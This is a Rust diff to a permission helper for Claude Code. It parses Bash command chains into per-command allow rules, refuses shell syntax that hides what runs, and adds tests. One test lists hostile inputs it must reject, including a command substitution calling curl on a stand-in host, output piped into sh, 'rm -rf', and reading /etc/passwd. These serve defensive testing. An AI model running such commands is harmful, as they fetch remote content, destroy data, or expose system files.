@@ -584,6 +584,228 @@ fn bash_rule(command: &str) -> Result<String, Refusal> {
     })
 }
 
+/// One word of a simple command, with its quotes removed.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct Word {
+    text: String,
+    /// Some part of it was in quotes.
+    quoted: bool,
+}
+
+/// How the previous simple command of a chain ended.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Joint {
+    /// `;` or a line break: nothing has to follow.
+    Sequence,
+    /// `&&`, `||` or `|`: a command has to follow.
+    Operator,
+}
+
+/// A `timeout 900` or `time` in front: it only limits or measures the command after it, so
+/// the rule is that command's. Anything with flags (`timeout -s KILL`) is left as it is.
+fn without_time_wrapper(words: &[String]) -> &[String] {
+    let is_duration = |w: &str| {
+        let digits = w.trim_end_matches(['s', 'm', 'h', 'd']);
+        !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit() || c == '.') && digits.chars().next().is_some_and(|c| c.is_ascii_digit())
+    };
+    match words {
+        [first, duration, rest @ ..] if first == "timeout" && is_duration(duration) && !rest.is_empty() => rest,
+        [first, rest @ ..] if first == "time" && !rest.is_empty() => rest,
+        _ => words,
+    }
+}
+
+/// Split a chain into simple commands of literal words. Accepted between commands: `&&`, `||`,
+/// `|`, `;` and line breaks; in a command: words, '…' and "…" (without `$`, backticks or `\`
+/// inside), and the redirections that write no file (`2>&1`, `>&2`, `>/dev/null`,
+/// `2>/dev/null`, `&>/dev/null`). Everything else (`$`, backticks, `\`, `<`, heredocs,
+/// subshells, braces, `!`, a `#` comment, a background `&`, a redirection to a file) is refused:
+/// the rules would not describe what runs.
+fn split_chain(command: &str) -> Result<Vec<Vec<Word>>, Refusal> {
+    const BAD: Refusal = Refusal::ShellSyntax;
+    let chars: Vec<char> = command.chars().collect();
+    let at = |i: usize| chars.get(i).copied();
+    let ends_target = |c: char| c == ' ' || c == '\t' || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')' | '\n');
+    let mut segments: Vec<Vec<Word>> = Vec::new();
+    let mut words: Vec<Word> = Vec::new();
+    let mut word = Word { text: String::new(), quoted: false };
+    let mut in_word = false;
+    let mut last = Joint::Sequence;
+
+    fn end_word(word: &mut Word, in_word: &mut bool, words: &mut Vec<Word>) {
+        if *in_word {
+            words.push(std::mem::replace(word, Word { text: String::new(), quoted: false }));
+            *in_word = false;
+        }
+    }
+    fn end_segment(words: &mut Vec<Word>, segments: &mut Vec<Vec<Word>>, joint: Joint, last: &mut Joint) -> Result<(), Refusal> {
+        if words.is_empty() {
+            // `; ;`, a chain that starts with an operator, or `a && ;`.
+            if joint == Joint::Operator || *last == Joint::Operator || segments.is_empty() {
+                return Err(BAD);
+            }
+        } else {
+            segments.push(std::mem::take(words));
+        }
+        *last = joint;
+        Ok(())
+    }
+
+    let mut i = 0;
+    while let Some(c) = at(i) {
+        match c {
+            ' ' | '\t' => end_word(&mut word, &mut in_word, &mut words),
+            '\'' => {
+                in_word = true;
+                word.quoted = true;
+                i += 1;
+                loop {
+                    match at(i) {
+                        None => return Err(BAD),
+                        Some('\'') => break,
+                        Some(q) if (q.is_control() && q != '\t') || is_invisible(q) => return Err(BAD),
+                        Some(q) => word.text.push(q),
+                    }
+                    i += 1;
+                }
+            }
+            '"' => {
+                in_word = true;
+                word.quoted = true;
+                i += 1;
+                loop {
+                    match at(i) {
+                        None => return Err(BAD),
+                        Some('"') => break,
+                        Some(q) if matches!(q, '$' | '`' | '\\') || (q.is_control() && q != '\t') || is_invisible(q) => return Err(BAD),
+                        Some(q) => word.text.push(q),
+                    }
+                    i += 1;
+                }
+            }
+            ';' | '\n' => {
+                end_word(&mut word, &mut in_word, &mut words);
+                end_segment(&mut words, &mut segments, Joint::Sequence, &mut last)?;
+            }
+            '&' if at(i + 1) == Some('&') => {
+                end_word(&mut word, &mut in_word, &mut words);
+                end_segment(&mut words, &mut segments, Joint::Operator, &mut last)?;
+                i += 1;
+            }
+            '|' if at(i + 1) == Some('&') => return Err(BAD),
+            '|' => {
+                end_word(&mut word, &mut in_word, &mut words);
+                end_segment(&mut words, &mut segments, Joint::Operator, &mut last)?;
+                if at(i + 1) == Some('|') {
+                    i += 1;
+                }
+            }
+            '>' | '&' => {
+                // `&>` needs `>` next; a lone `&` runs in the background.
+                if c == '&' {
+                    if at(i + 1) != Some('>') {
+                        return Err(BAD);
+                    }
+                    i += 1;
+                }
+                // A file-descriptor number right before `>` (`2>`) belongs to the redirection.
+                if in_word {
+                    if c == '>' && !word.quoted && word.text.chars().all(|d| d.is_ascii_digit()) {
+                        word.text.clear();
+                        in_word = false;
+                    } else {
+                        return Err(BAD);
+                    }
+                }
+                i += 1;
+                if at(i) == Some('>') {
+                    i += 1;
+                }
+                if at(i) == Some('&') {
+                    // `>&2`: duplicate a descriptor, no file.
+                    i += 1;
+                    let start = i;
+                    while at(i).is_some_and(|d| d.is_ascii_digit()) {
+                        i += 1;
+                    }
+                    if i == start || at(i).is_some_and(|n| !ends_target(n)) {
+                        return Err(BAD);
+                    }
+                } else {
+                    while matches!(at(i), Some(' ' | '\t')) {
+                        i += 1;
+                    }
+                    let mut target = String::new();
+                    while let Some(t) = at(i).filter(|t| !ends_target(*t)) {
+                        target.push(t);
+                        i += 1;
+                    }
+                    if target != "/dev/null" {
+                        return Err(BAD);
+                    }
+                }
+                continue;
+            }
+            '#' if !in_word => return Err(BAD),
+            c if is_shell_syntax(c) => return Err(BAD),
+            c => {
+                word.text.push(c);
+                in_word = true;
+            }
+        }
+        i += 1;
+    }
+    end_word(&mut word, &mut in_word, &mut words);
+    if words.is_empty() {
+        if last == Joint::Operator || segments.is_empty() {
+            return Err(BAD);
+        }
+    } else {
+        segments.push(words);
+    }
+    Ok(segments)
+}
+
+/// [`bash_rule`] for a whole command line: a simple command gets its one rule; a chain (see
+/// [`split_chain`]) gets one rule per distinct simple command, and only when every one of them
+/// has a safe prefix rule. A command whose rule would have to be the exact text (a subcommand
+/// that writes files) cannot be part of a chain: its exact text is not a rule of its own.
+fn bash_rules(command: &str) -> Result<Vec<String>, Refusal> {
+    if !command.chars().any(is_shell_syntax) {
+        let words: Vec<String> = command.split([' ', '\t']).filter(|w| !w.is_empty()).map(String::from).collect();
+        let inner = without_time_wrapper(&words);
+        return if inner.len() == words.len() { bash_rule(command).map(|r| vec![r]) } else { bash_rule(&inner.join(" ")).map(|r| vec![r]) };
+    }
+    let mut rules: Vec<String> = Vec::new();
+    for segment in split_chain(command)? {
+        if segment.first().is_some_and(|w| w.quoted) {
+            return Err(Refusal::NotPlainProgram);
+        }
+        // A word that would not survive as one plain word (it held spaces or shell characters
+        // inside quotes) stands in as `ARG`: only the program, its subcommand and its flags
+        // decide the rule, and a flag must be seen as it is.
+        let words = segment
+            .iter()
+            .map(|w| {
+                let plain = !w.text.is_empty() && !w.text.chars().any(|c| is_shell_syntax(c) || matches!(c, ' ' | '\t' | '"' | '\''));
+                match (plain, w.text.starts_with('-')) {
+                    (true, _) => Ok(w.text.clone()),
+                    (false, true) => Err(Refusal::ShellSyntax),
+                    (false, false) => Ok("ARG".to_string()),
+                }
+            })
+            .collect::<Result<Vec<String>, Refusal>>()?;
+        let rule = bash_rule(&without_time_wrapper(&words).join(" "))?;
+        if !rule.ends_with(":*)") {
+            return Err(Refusal::ShellSyntax);
+        }
+        if !rules.contains(&rule) {
+            rules.push(rule);
+        }
+    }
+    Ok(rules)
+}
+
 /// Claude Code's spelling of an absolute path in a rule: `//` and the path.
 fn abs_path_rule(path: &Path) -> String {
     format!("/{}", path.display())
@@ -814,11 +1036,39 @@ pub fn allow_rule(tool: &str, input: &Value, blocked_path: Option<&str>, places:
     rule_for(tool, input, blocked_path, places).ok()
 }
 
+/// [`rule_for`], except that a Bash chain (`a && b | c`, `2>&1`, `>/dev/null`) gets one rule
+/// per simple command when every one of them has a safe rule (see [`bash_rules`]).
+pub fn rules_for(tool: &str, input: &Value, blocked_path: Option<&str>, places: &Places) -> Result<Vec<String>, Refusal> {
+    match tool {
+        "Bash" => bash_rules(str_field(input, "command").ok_or(Refusal::NoRule)?),
+        _ => rule_for(tool, input, blocked_path, places).map(|rule| vec![rule]),
+    }
+}
+
+/// The rules that already allow this call, when the person saved every one of them before
+/// (project or user settings): the call is then allowed without asking again. Claude Code
+/// matches rules itself too, but not always the way jev-code derives them (a `timeout 900`
+/// in front, a chain), so a call it still asks about is checked here. A call asked about
+/// because of a path outside the allowed folders is never answered from rules alone.
+pub fn remembered(tool: &str, input: &Value, blocked_path: Option<&str>, places: &Places) -> Option<Vec<String>> {
+    if blocked_path.is_some() {
+        return None;
+    }
+    let rules = rules_for(tool, input, None, places).ok()?;
+    let mut allowed = load(&local_settings_path(&places.project)).map(|s| s.list(List::Allow)).unwrap_or_default();
+    if let Some(home) = &places.home {
+        allowed.extend(load(&user_settings_path(home)).map(|s| s.list(List::Allow)).unwrap_or_default());
+    }
+    (!rules.is_empty() && rules.iter().all(|r| allowed.contains(r))).then_some(rules)
+}
+
 /// What "always" would save for one request: an allow rule, a folder Claude Code may then
 /// use, or both.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Always {
-    pub rule: Option<String>,
+    /// The allow rules to save: one, or one per simple command of a chain
+    /// (`cargo build 2>&1 | grep x` saves `Bash(cargo build:*)` and `Bash(grep:*)`).
+    pub rules: Vec<String>,
     pub folder: Option<PathBuf>,
 }
 
@@ -826,9 +1076,10 @@ impl Always {
     /// What is saved, in words that are also what the answer line says.
     pub fn label(&self) -> String {
         let folder = self.folder.as_ref().map(|f| format!("folder {}", f.display()));
-        match (&self.rule, folder) {
-            (Some(rule), Some(folder)) => format!("{rule} and {folder}"),
-            (Some(rule), None) => rule.clone(),
+        let rules = (!self.rules.is_empty()).then(|| self.rules.join(", "));
+        match (rules, folder) {
+            (Some(rules), Some(folder)) => format!("{rules} and {folder}"),
+            (Some(rules), None) => rules,
             (None, Some(folder)) => folder,
             (None, None) => String::new(),
         }
@@ -856,10 +1107,10 @@ fn blocked_folder(blocked_path: &str, places: &Places) -> Result<PathBuf, Refusa
 /// because its path is outside the allowed folders needs that folder allowed (a command rule
 /// alone would be asked about again), with the command rule too when a safe one exists.
 pub fn always_plan(tool: &str, input: &Value, blocked_path: Option<&str>, places: &Places) -> Offer {
-    let rule = rule_for(tool, input, blocked_path, places);
+    let rules = rules_for(tool, input, blocked_path, places);
     match (tool, blocked_path) {
-        ("Bash", Some(path)) => Ok(Always { rule: rule.ok(), folder: Some(blocked_folder(path, places)?) }),
-        _ => Ok(Always { rule: Some(rule?), folder: None }),
+        ("Bash", Some(path)) => Ok(Always { rules: rules.unwrap_or_default(), folder: Some(blocked_folder(path, places)?) }),
+        _ => Ok(Always { rules: rules?, folder: None }),
     }
 }
 
@@ -886,7 +1137,8 @@ pub enum Settled {
 /// everything was already there.
 pub fn save_always(project: &Path, always: &Always) -> Result<bool, SettingsError> {
     update(&local_settings_path(project), |settings| {
-        let rule_added = always.rule.as_deref().is_some_and(|rule| settings.add(List::Allow, rule));
+        // Every rule is tried (no short-circuit), so all of them end up in the file.
+        let rule_added = always.rules.iter().fold(false, |added, rule| settings.add(List::Allow, rule) || added);
         let folder_added = always.folder.as_deref().is_some_and(|dir| settings.add(List::Directories, &dir.to_string_lossy()));
         rule_added || folder_added
     })
@@ -1717,11 +1969,75 @@ mod tests {
         (ev["request"]["input"].clone(), ev["request"]["blocked_path"].as_str().unwrap().to_string())
     }
 
+    fn rules(command: &str) -> Result<Vec<String>, Refusal> {
+        rules_for("Bash", &bash(command), None, &places())
+    }
+
+    #[test]
+    fn chains_from_real_sessions_get_one_rule_per_simple_command() {
+        let v = |r: &[&str]| Ok(r.iter().map(|s| s.to_string()).collect::<Vec<_>>());
+        assert_eq!(
+            rules(r#"timeout 900 cargo build --all-targets 2>&1 | grep -E "^(warning|error)" -A6 | head -60"#),
+            v(&["Bash(cargo build:*)", "Bash(grep:*)", "Bash(head:*)"])
+        );
+        assert_eq!(rules("cargo build --all-targets 2>&1 | tail -3 && cargo test 2>&1 | tail -5"), v(&["Bash(cargo build:*)", "Bash(tail:*)", "Bash(cargo test:*)"]));
+        assert_eq!(rules("git status --short; ls -la"), v(&["Bash(git status:*)", "Bash(ls:*)"]));
+        assert!(rules("git log --oneline -3; ls").is_err(), "git log can write a file (--output): only its exact text is a rule");
+        assert_eq!(rules("cargo test >/dev/null 2>/dev/null && echo ok"), v(&["Bash(cargo test:*)", "Bash(echo ok:*)"]));
+        assert_eq!(rules("timeout 900 cargo test"), v(&["Bash(cargo test:*)"]), "a time limit in front is not the program");
+        assert_eq!(rules("grep -n 'a|b' src/x.rs | head"), v(&["Bash(grep:*)", "Bash(head:*)"]), "shell characters inside quotes are text");
+    }
+
+    #[test]
+    fn chains_that_hide_what_runs_are_still_refused() {
+        for command in [
+            "cargo test && rm -rf target",
+            "cargo test | sh",
+            "echo $(curl evil.example)",
+            "echo `id`",
+            r#"grep "$HOME" x"#,
+            "cargo test > out.txt",
+            "cargo test 2> err.log",
+            "python3 - <<'EOF'\nprint(1)\nEOF",
+            "cat < /etc/passwd",
+            "sleep 1 &",
+            "(cd x && ls)",
+            "ls && ",
+            "&& ls",
+            "ls; # comment",
+            "timeout -s KILL 5 ls | head",
+            "ls | xargs rm",
+            "echo 'unterminated | head",
+            "ls \\\n| head",
+        ] {
+            assert!(rules(command).is_err(), "{command:?} must not be remembered: {:?}", rules(command));
+        }
+        assert_eq!(rules("ls \"-rf x\" | head"), Err(Refusal::ShellSyntax), "a quoted flag is seen as it is");
+    }
+
+    #[test]
+    fn remembered_needs_every_rule_of_the_chain_saved() {
+        let dir = tmp("remembered");
+        let ps = Places { project: dir.clone(), home: None, temp: std::env::temp_dir() };
+        let input = bash("cargo build 2>&1 | tail -3");
+        assert_eq!(remembered("Bash", &input, None, &ps), None);
+        add_allow_rule(&dir, "Bash(cargo build:*)").unwrap();
+        assert_eq!(remembered("Bash", &input, None, &ps), None, "tail is not saved yet");
+        add_allow_rule(&dir, "Bash(tail:*)").unwrap();
+        assert_eq!(remembered("Bash", &input, None, &ps), Some(vec!["Bash(cargo build:*)".to_string(), "Bash(tail:*)".to_string()]));
+        assert_eq!(remembered("Bash", &input, Some("/etc/x"), &ps), None, "a blocked path is never answered from rules");
+        assert_eq!(remembered("Bash", &bash("cargo build && rm x"), None, &ps), None);
+        let plan = always_plan("Bash", &bash("cargo test | head"), None, &ps).unwrap();
+        assert_eq!(plan.label(), "Bash(cargo test:*), Bash(head:*)");
+        assert_eq!(save_always(&dir, &plan), Ok(true));
+        assert!(load(&local_settings_path(&dir)).unwrap().list(List::Allow).contains(&"Bash(head:*)".to_string()));
+    }
+
     #[test]
     fn a_path_blocked_bash_call_gets_its_folder_and_a_command_rule() {
         let (input, blocked) = recorded();
         let plan = always_plan("Bash", &input, Some(&blocked), &places()).unwrap();
-        assert_eq!(plan, Always { rule: Some("Bash(touch:*)".into()), folder: Some(PathBuf::from("/tmp/spike")) });
+        assert_eq!(plan, Always { rules: vec!["Bash(touch:*)".into()], folder: Some(PathBuf::from("/tmp/spike")) });
         assert_eq!(plan.label(), "Bash(touch:*) and folder /tmp/spike");
     }
 
@@ -1730,7 +2046,7 @@ mod tests {
         let (_, blocked) = recorded();
         let input = bash("bash -c 'touch /tmp/spike/outside.txt'");
         let plan = always_plan("Bash", &input, Some(&blocked), &places()).unwrap();
-        assert_eq!(plan, Always { rule: None, folder: Some(PathBuf::from("/tmp/spike")) });
+        assert_eq!(plan, Always { rules: vec![], folder: Some(PathBuf::from("/tmp/spike")) });
         assert_eq!(plan.label(), "folder /tmp/spike");
     }
 
@@ -1799,7 +2115,7 @@ mod tests {
     #[test]
     fn other_blocked_tools_keep_their_rules_and_add_no_folder() {
         let plan = always_plan("Read", &json!({"file_path": "x"}), Some("/home/u/data/f.txt"), &places()).unwrap();
-        assert_eq!(plan, Always { rule: Some("Read(//home/u/data/**)".into()), folder: None });
+        assert_eq!(plan, Always { rules: vec!["Read(//home/u/data/**)".into()], folder: None });
         assert_eq!(always_plan("Task", &json!({}), None, &places()), Err(Refusal::NoRule));
         assert_eq!(always_plan("Bash", &bash("bash -c x"), None, &places()), Err(Refusal::RunsOtherCommands));
     }
@@ -1807,7 +2123,7 @@ mod tests {
     #[test]
     fn always_saves_the_rule_and_the_folder_in_one_write_or_neither() {
         let dir = tmp("save-always");
-        let both = Always { rule: Some("Bash(touch:*)".into()), folder: Some(PathBuf::from("/tmp/spike")) };
+        let both = Always { rules: vec!["Bash(touch:*)".into()], folder: Some(PathBuf::from("/tmp/spike")) };
         assert_eq!(save_always(&dir, &both), Ok(true));
         let saved = load(&local_settings_path(&dir)).unwrap();
         assert_eq!((saved.list(List::Allow), saved.list(List::Directories)), (vec!["Bash(touch:*)".to_string()], vec!["/tmp/spike".to_string()]));
